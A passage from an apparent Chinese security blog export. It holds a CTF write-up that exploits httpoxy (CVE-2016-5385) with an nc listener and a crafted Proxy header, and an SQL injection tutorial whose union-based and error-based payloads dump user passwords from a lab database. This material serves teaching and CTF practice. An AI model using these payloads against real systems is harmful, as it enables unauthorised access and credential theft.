class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/vendor/autoload.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">GuzzleHttp</span>\\<span class=\"title\">Client</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'flag'</span>])) &#123;</span><br><span class=\"line\">    $client = <span class=\"keyword\">new</span> Client();</span><br><span class=\"line\">    $response = $client-&gt;get(<span class=\"string\">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class=\"line\">    $content = $response-&gt;getBody();</span><br><span class=\"line\">    $data = json_decode($content, <span class=\"keyword\">TRUE</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($data[<span class=\"string\">'success'</span>] === <span class=\"keyword\">true</span>) &#123;   <span class=\"comment\">//true返回值是数组,否则返回值为object</span></span><br><span class=\"line\">      <span class=\"keyword\">echo</span> system(<span class=\"string\">'/readflag'</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'file'</span>])) &#123;</span><br><span class=\"line\">    highlight_file($_GET[<span class=\"string\">'file'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'phpinfo'</span>])) &#123;</span><br><span class=\"line\">    phpinfo();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>查看phpinfo</p>\n<p>是5.6.23版本的</p>\n<p>发现没有禁用函数</p>\n<table>\n<thead>\n<tr>\n<th>allow_url_fopen</th>\n<th>On</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>allow_url_include</td>\n<td>Off</td>\n</tr>\n</tbody></table>\n<p>存在任意文件读取</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//autoload.php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"keyword\">__DIR__</span> . <span class=\"string\">'/composer/autoload_real.php'</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">return</span> ComposerAutoloaderInit52ffee59545490028d211df73b41c57d::getLoader();</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//autoload_real.php</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//./vendor/composer/ClassLoader.php</span></span><br></pre></td></tr></table></figure>\n\n<p><del>看到guzzlehttp/guzzle有任意写文件漏洞<a href=\"https://www.anquanke.com/post/id/86452\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/86452</a></del></p>\n<p>查看composer.json</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//composer.json</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">   <span class=\"string\">\"require\"</span>: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"guzzlehttp/guzzle\"</span>: <span class=\"string\">\"6.2.0\"</span></span><br><span class=\"line\">   &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p>出题人<a href=\"https://www.zhaoj.in/read-6407.html\" target=\"_blank\" rel=\"noopener\">赵师傅博客</a>也说了是改自<a href=\"https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy\" target=\"_blank\" rel=\"noopener\">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p>\n<p>考点是cgi 的httpproxy漏洞（CVE-2016-5385） vulhub上有漏洞说明</p>\n<blockquote>\n<p>CGI的英文是（COMMON GATEWAY INTERFACE）公共网关接口，它的作用就是帮助服务器与语言通信，这里就是nginx和php进行通信，因为nginx和php的语言不通，因此需要一个沟通转换的过程，而CGI就是这个沟通的协议。</p>\n<p>nginx服务器在接受到浏览器传递过来的数据后，如果请求的是静态的页面或者图片等无需动态处理的则会直接根据请求的url找到其位置然后返回给浏览器，这里无需php参与，但是如果是一个动态的页面请求，这个时候nginx就必须与php通信，这个时候就会需要用到cgi协议，将请求数据转换成php能理解的信息，然后php根据这些信息返回的信息也要通过cgi协议转换成nginx可以理解的信息，最后nginx接到这些信息再返回给浏览器。</p>\n</blockquote>\n<p>访问请求时，添加一个proxy头部，浏览就会转发到 代理服务器，此时的访问就变成了代理服务器的127.0.0.1:500</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$response = $client-&gt;get(<span class=\"string\">'http://127.0.0.1:5000/api/eligible'</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在代理服务器中弄一个web服务器，api/eligible的内容为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;&quot;success&quot;:True&#125;</span><br></pre></td></tr></table></figure>\n\n<p>即可得到。</p>\n<p><strong>注意</strong></p>\n<p>由于在buuoj上无法访问外网，但是可以获取一台内网linux的控制权，搭建一台代理服务器，也有更简单的方式，</p>\n<p>创建一个文件内容为例如 a.txt</p>\n<figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 <span class=\"number\">200</span> OK</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;\"success\":true&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在linux上使用命令</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvp 1234 &lt; a.txt</span><br></pre></td></tr></table></figure>\n\n<p>然后发访问<a href=\"http://xxx/?flag，抓包添加一个proxy头部\" target=\"_blank\" rel=\"noopener\">http://xxx/?flag，抓包添加一个proxy头部</a> 地址为你获取控制权的linux ip地址</p>\n<figure class=\"highlight http\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">GET</span> <span class=\"string\">/?flag</span> HTTP/1.1</span><br><span class=\"line\"><span class=\"attribute\">Host</span>: node3.buuoj.cn:25315</span><br><span class=\"line\"><span class=\"attribute\">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class=\"line\"><span class=\"attribute\">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class=\"line\"><span class=\"attribute\">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class=\"line\"><span class=\"attribute\">Accept-Encoding</span>: gzip, deflate</span><br><span class=\"line\"><span class=\"attribute\">Connection</span>: close</span><br><span class=\"line\"><span class=\"attribute\">Upgrade-Insecure-Requests</span>: 1</span><br><span class=\"line\"><span class=\"attribute\">Cache-Control</span>: max-age=0, no-cache</span><br><span class=\"line\"><span class=\"attribute\">Proxy</span>: http://174.0.246.216:1234/</span><br><span class=\"line\"><span class=\"attribute\">Pragma</span>: no-cache</span><br></pre></td></tr></table></figure>\n\n<p>即可获取flag</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> </span><br><span class=\"line\"> ········</span><br><span class=\"line\"> </span><br><span class=\"line\">#DD0000\"&gt;'phpinfo'<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"color: #007700\"</span>&gt;</span>]))<span class=\"symbol\">&amp;nbsp;</span>&#123;<span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"symbol\">&amp;nbsp;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"color: #0000BB\"</span>&gt;</span>phpinfo<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">span</span> <span class=\"attr\">style</span>=<span class=\"string\">\"color: #007700\"</span>&gt;</span>();<span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span>&#125;<span class=\"tag\">&lt;<span class=\"name\">br</span> /&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span>flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br><span class=\"line\">flag&#123;7d7b2c9e-088c-4733-b70a-8ff3351479a7&#125;</span><br></pre></td></tr></table></figure>"},{"title":"sql注入的原理","date":"2020-01-05T08:08:54.000Z","_content":"\n## 0x00 介绍\n\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n\n<!--more-->\n\n## 0x01 某些函数的使用方法\n\n1. concat(str1,str2,str3,...),将多个字符串连接成一个字符串。\n\n2. concat_ws(分隔符, str1, str2, ...),添加了分割符（concat_ws就是concat with separator）\n3. group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。\n\n[参考文章](https://blog.csdn.net/Mary19920410/article/details/76545053)\n\n4. if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3\n5. substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 \n\n   - MySQL: SUBSTR( ), SUBSTRING( )\n   - Oracle: SUBSTR( )\n   - SQL Server: SUBSTRING( ) \n6. char()**将十进制数转换成字符**，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数\n7. sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果\n8. Length() 返回字符串的长度\n9. database() 返回当前数据库名称\n10. count(*) ,计数\n11. floor(value)函数返回小于或等于指定值（value）的最小整数\n12. ceiling(value)函数返回大于或等于指定值（value）的最小整数\n13. rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为`0.15522042769493574`\n14. 查询xml函数**extractvalue(目标xml文档，xml路径)**与更新xml函数**updatexml(目标xml文档，xml路径，更新的内容)**  最大只能出32字符\n15. reverse(str)翻转字符串\n16. limit pos,len，   从pos开始查询，查询len条数据    \n17. set 可以设置变量\n18. prepare 预处理\n19. \n\n## 0x02 操作过程与分析\n\n### a. 基本注入\n\n1. 使用order/group by 判断字段长度\n\n   users表中内容\n\n   ```shell\n   mysql> select * from users\n       -> ;\n   +----+----------+------------+\n   | id | username | password   |\n   +----+----------+------------+\n   |  1 | Dumb     | Dumb       |\n   |  2 | Angelina | I-kill-you |\n   |  3 | Dummy    | p@ssword   |\n   |  4 | secure   | crappy     |\n   |  5 | stupid   | stupidity  |\n   |  6 | superman | genious    |\n   |  7 | batman   | mob!le     |\n   |  8 | admin    | admin      |\n   +----+----------+------------+\n   ```\n\n   `?id=%27 order by 3 %23`\n\n   `?id=%27 order by 4 %23`\n\n   ![](/pic/28.png)\n\n   ![](/pic/29.png)\n\n   4报错，3没有报错，表示此表有三列。\n\n   *sql 控制台的执行结果*\n\n   ```\n   mysql> select * from users where id=0 order by 4;\n   ERROR 1054 (42S22): Unknown column '4' in 'order clause'\n   mysql> select * from user where id=0 order by 3;\n   Empty set (0.00 sec)\n   \n   ```\n\n   查看回显位置\n\n   `?id=%27 union select 1,2,3 %23`\n\n   ![](/pic/30.png)  2，3处有回显。\n\n   *sql控制台执行结果*\n\n   ```\n   mysql> select * from user where id=0 union select 1,2,3;\n   +------+----------+----------+\n   | id   | username | password |\n   +------+----------+----------+\n   |    1 | 2        | 3        |\n   +------+----------+----------+\n   1 row in set (0.00 sec)\n   ```\n\n   因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。\n\n2. 获取数据库名\n\n   `?id=%27 union select 1,database() ,3 %23`\n\n   ![](/pic/31.png)\n\n   ````\n   mysql> select * from users where id=0 union select 1,database(),3;\n   +----+----------+----------+\n   | id | username | password |\n   +----+----------+----------+\n   |  1 | security | 3        |\n   +----+----------+----------+\n   1 row in set (0.00 sec)\n   ````\n\n3. 获取表名\n\n   在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名\n\n   ![](/32.png)\n\n   `?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema='security' %23`\n\n   ![](/33.png)\n\n4. 获取列名\n\n   在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名\n\n   ```\n   mysql> select * from columns where table_name='users' and table_schema='security'\n       -> ;\n   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+\n   | TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |\n   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+\n   | def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |\n   | def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |\n   | def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |\n   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+\n   3 rows in set (0.00 sec)\n   ```\n\n   `?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema='security' %23`\n\n   ![](/34.png)\n\n5. 获取内容\n\n   获取users表的username和password\n\n   `?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23`\n\n   ![](/35.png)\n\n### b. 报错注入\n\n1. 查询数据库\n\n   `?id=0' and updatexml(1,concat(1,(select database())),1)%23`\n\n   或者`?id=0' and extractvalue(1,concat(1,(select database())))%23`\n\n   `?id=0' and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+`(在测试时，这一条buu上无回显，但是本地是可以的，**此条语句最多能显示64个字符，上面两条最多32个**)\n\n   ![](/36.png)\n\n2.  查询表名 *与基本注入相同不在重复*\n\n3.  查询列名 *与基本注入相同不在重复*\n\n4.  查信息\n\n   `?id=0' and extractvalue(1,concat(1,(select substr(concat(username,'~',password),1,30) from users limit 2,1 )))%23`\n\n   或者\n\n   `?id=0' and updatexml(1,concat(1,(select substr(concat(username,'~',password),1,30) from users limit 2,1 )),1)%23`\n\n   或者\n\n   `?id=0' and (select 0 from (select count(*),concat((select concat(username,'~',password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+`\n\n   通过修改limit 一条一条查询\n\n### c. 输出文件注入\n\n\n\n","source":"_posts/sql注入的原理.md","raw":"---\ntitle: sql注入的原理\ndate: 2020-01-05 16:08:54\ntags:\n - web\n - sql\ncategories: \n - 日常积累\n---\n\n## 0x00 介绍\n\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n\n<!--more-->\n\n## 0x01 某些函数的使用方法\n\n1. concat(str1,str2,str3,...),将多个字符串连接成一个字符串。\n\n2. concat_ws(分隔符, str1, str2, ...),添加了分割符（concat_ws就是concat with separator）\n3. group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator '分隔符'] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。\n\n[参考文章](https://blog.csdn.net/Mary19920410/article/details/76545053)\n\n4. if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3\n5. substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 \n\n   - MySQL: SUBSTR( ), SUBSTRING( )\n   - Oracle: SUBSTR( )\n   - SQL Server: SUBSTRING( ) \n6. char()**将十进制数转换成字符**，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数\n7. sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果\n8. Length() 返回字符串的长度\n9. database() 返回当前数据库名称\n10. count(*) ,计数\n11. floor(value)函数返回小于或等于指定值（value）的最小整数\n12. ceiling(value)函数返回大于或等于指定值（value）的最小整数\n13. rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为`0.15522042769493574`\n14. 查询xml函数**extractvalue(目标xml文档，xml路径)**与更新xml函数**updatexml(目标xml文档，xml路径，更新的内容)**  最大只能出32字符\n15. reverse(str)翻转字符串\n16. limit pos,len，   从pos开始查询，查询len条数据    \n17. set 可以设置变量\n18. prepare 预处理\n19. \n\n## 0x02 操作过程与分析\n\n### a. 基本注入\n\n1. 使用order/group by 判断字段长度\n\n   users表中内容\n\n   ```shell\n   mysql> select * from users\n       -> ;\n   +----+----------+------------+\n   | id | username | password   |\n   +----+----------+------------+\n   |  1 | Dumb     | Dumb       |\n   |  2 | Angelina | I-kill-you |\n   |  3 | Dummy    | p@ssword   |\n   |  4 | secure   | crappy     |\n   |  5 | stupid   | stupidity  |\n   |  6 | superman | genious    |\n   |  7 | batman   | mob!le     |\n   |  8 | admin    | admin      |\n   +----+----------+------------+\n   ```\n\n   `?id=%27 order by 3 %23`\n\n   `?id=%27 order by 4 %23`\n\n   ![](/pic/28.png)\n\n   ![](/pic/29.png)\n\n   4报错，3没有报错，表示此表有三列。\n\n   *sql 控制台的执行结果*\n\n   ```\n   mysql> select * from users where id=0 order by 4;\n   ERROR 1054 (42S22): Unknown column '4' in 'order clause'\n   mysql> select * from user where id=0 order by 3;\n   Empty set (0.00 sec)\n   \n   ```\n\n   查看回显位置\n\n   `?id=%27 union select 1,2,3 %23`\n\n   ![](/pic/30.png)  2，3处有回显。\n\n   *sql控制台执行结果*\n\n   ```\n   mysql> select * from user where id=0 union select 1,2,3;\n   +------+----------+----------+\n   | id   | username | password |\n   +------+----------+----------+\n   |    1 | 2        | 3        |\n   +------+----------+----------+\n   1 row in set (0.00 sec)\n   ```\n\n   因为sql控制台是所有都显示的，网页的界面的前端代码设置回显。\n\n2. 获取数据库名\n\n   `?id=%27 union select 1,database() ,3 %23`\n\n   ![](/pic/31.png)\n\n   ````\n   mysql> select * from users where id=0 union select 1,database(),3;\n   +----+----------+----------+\n   | id | username | password |\n   +----+----------+----------+\n   |  1 | security | 3        |\n   +----+----------+----------+\n   1 row in set (0.00 sec)\n   ````\n\n3. 获取表名\n\n   在mysql的数据库中包含一个数据库，information_schema，其中的tables表中记录所有数据库的表名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名\n\n   ![](/32.png)\n\n   `?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema='security' %23`\n\n   ![](/33.png)\n\n4. 获取列名\n\n   在information_schema中，columns表中记录所有数据库所有表的列名,table_schema栏记录是所属的数据库，table_name记录数据库包含的表名，column_name,记录的是列名\n\n   ```\n   mysql> select * from columns where table_name='users' and table_schema='security'\n       -> ;\n   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+\n   | TABLE_CATALOG | TABLE_SCHEMA | TABLE_NAME | COLUMN_NAME | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME    | COLUMN_TYPE | COLUMN_KEY | EXTRA          | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION |\n   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+\n   | def           | security     | users      | id          |                1 | NULL           | NO          | int       |                     NULL |                   NULL |                10 |             0 |               NULL | NULL               | NULL              | int(3)      | PRI        | auto_increment | select,insert,update,references |                |                       |\n   | def           | security     | users      | username    |                2 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |\n   | def           | security     | users      | password    |                3 | NULL           | NO          | varchar   |                       20 |                     20 |              NULL |          NULL |               NULL | latin1             | latin1_swedish_ci | varchar(20) |            |                | select,insert,update,references |                |                       |\n   +---------------+--------------+------------+-------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+-------------------+-------------+------------+----------------+---------------------------------+----------------+-----------------------+\n   3 rows in set (0.00 sec)\n   ```\n\n   `?id=%27 union select 1,group_concat(table_name) ,3  from information_schema.tables where table_schema='security' %23`\n\n   ![](/34.png)\n\n5. 获取内容\n\n   获取users表的username和password\n\n   `?id=%27 union select 1,group_concat(username) ,group_concat(password)  from users %23`\n\n   ![](/35.png)\n\n### b. 报错注入\n\n1. 查询数据库\n\n   `?id=0' and updatexml(1,concat(1,(select database())),1)%23`\n\n   或者`?id=0' and extractvalue(1,concat(1,(select database())))%23`\n\n   `?id=0' and (select 1 from (select count(*),concat((select database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+`(在测试时，这一条buu上无回显，但是本地是可以的，**此条语句最多能显示64个字符，上面两条最多32个**)\n\n   ![](/36.png)\n\n2.  查询表名 *与基本注入相同不在重复*\n\n3.  查询列名 *与基本注入相同不在重复*\n\n4.  查信息\n\n   `?id=0' and extractvalue(1,concat(1,(select substr(concat(username,'~',password),1,30) from users limit 2,1 )))%23`\n\n   或者\n\n   `?id=0' and updatexml(1,concat(1,(select substr(concat(username,'~',password),1,30) from users limit 2,1 )),1)%23`\n\n   或者\n\n   `?id=0' and (select 0 from (select count(*),concat((select concat(username,'~',password) from users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+`\n\n   通过修改limit 一条一条查询\n\n### c. 输出文件注入\n\n\n\n","slug":"sql注入的原理","published":1,"updated":"2020-01-05T08:08:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck7vssfm6001bpk7e75mibn4s","content":"<h2 id=\"0x00-介绍\"><a href=\"#0x00-介绍\" class=\"headerlink\" title=\"0x00 介绍\"></a>0x00 介绍</h2><p>SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。</p>\n<a id=\"more\"></a>\n\n<h2 id=\"0x01-某些函数的使用方法\"><a href=\"#0x01-某些函数的使用方法\" class=\"headerlink\" title=\"0x01 某些函数的使用方法\"></a>0x01 某些函数的使用方法</h2><ol>\n<li><p>concat(str1,str2,str3,…),将多个字符串连接成一个字符串。</p>\n</li>\n<li><p>concat_ws(分隔符, str1, str2, …),添加了分割符（concat_ws就是concat with separator）</p>\n</li>\n<li><p>group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )，将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>\n</li>\n</ol>\n<p><a href=\"https://blog.csdn.net/Mary19920410/article/details/76545053\" target=\"_blank\" rel=\"noopener\">参考文章</a></p>\n<ol start=\"4\">\n<li><p>if(表达式1，表达式2，表达式3)，如果表达式1的值为真，执行表达式2，否则执行表达式3</p>\n</li>\n<li><p>substr(str,pos,len)/  mid(str,pos,len),从pos处开始截取，截取长度为len的字符 </p>\n<ul>\n<li>MySQL: SUBSTR( ), SUBSTRING( )</li>\n<li>Oracle: SUBSTR( )</li>\n<li>SQL Server: SUBSTRING( ) </li>\n</ul>\n</li>\n<li><p>char()<strong>将十进制数转换成字符</strong>，在过滤掉单双引号的时使用较多；与其相反的是ascii()函数</p>\n</li>\n<li><p>sleep(n)，暂停数据库n秒，benchmarlk(count，表达式)，将表达式执行count次可以达到延迟效果</p>\n</li>\n<li><p>Length() 返回字符串的长度</p>\n</li>\n<li><p>database() 返回当前数据库名称</p>\n</li>\n<li><p>count(*) ,计数</p>\n</li>\n<li><p>floor(value)函数返回小于或等于指定值（value）的最小整数</p>\n</li>\n<li><p>ceiling(value)函数返回大于或等于指定值（value）的最小整数</p>\n</li>\n<li><p>rand()产生随机数介于0和1之间的一个数,rand(0)，则返回值都为<code>0.15522042769493574</code></p>\n</li>\n<li><p>查询xml函数<strong>extractvalue(目标xml文档，xml路径)</strong>与更新xml函数<strong>updatexml(目标xml文档，xml路径，更新的内容)</strong>  最大只能出32字符</p>\n</li>\n<li><p>reverse(str)翻转字符串</p>\n</li>\n<li><p>limit pos,len，   从pos开始查询，查询len条数据    </p>\n</li>\n<li><p>set 可以设置变量</p>\n</li>\n<li><p>prepare 预处理</p>\n</li>\n<li></li>\n</ol>\n<h2 id=\"0x02-操作过程与分析\"><a href=\"#0x02-操作过程与分析\" class=\"headerlink\" title=\"0x02 操作过程与分析\"></a>0x02 操作过程与分析</h2><h3 id=\"a-基本注入\"><a href=\"#a-基本注入\" class=\"headerlink\" title=\"a. 基本注入\"></a>a. 基本注入</h3><ol>\n<li><p>使用order/group by 判断字段长度</p>\n<p>users表中内容</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">mysql&gt;</span><span class=\"bash\"> select * from users</span></span><br><span class=\"line\">    -&gt; ;</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">| id | username | password   |</span><br><span class=\"line\">+----+----------+------------+</span><br><span class=\"line\">|  1 | Dumb     | Dumb       |</span><br><span class=\"line\">|  2 | Angelina | I-kill-you |</span><br><span class=\"line\">|  3 | Dummy    | p@ssword   |</span><br><span class=\"line\">|  4 | secure   | crappy     |</span><br><span class=\"line\">|  5 | stupid   | stupidity  |</span><br><span class=\"line\">|  6 | superman | genious    |</span><br><span class=\"line\">|  7 | batman   | mob!le     |</span><br><span class=\"line\">|  8 | admin    | admin      |</span><br><span 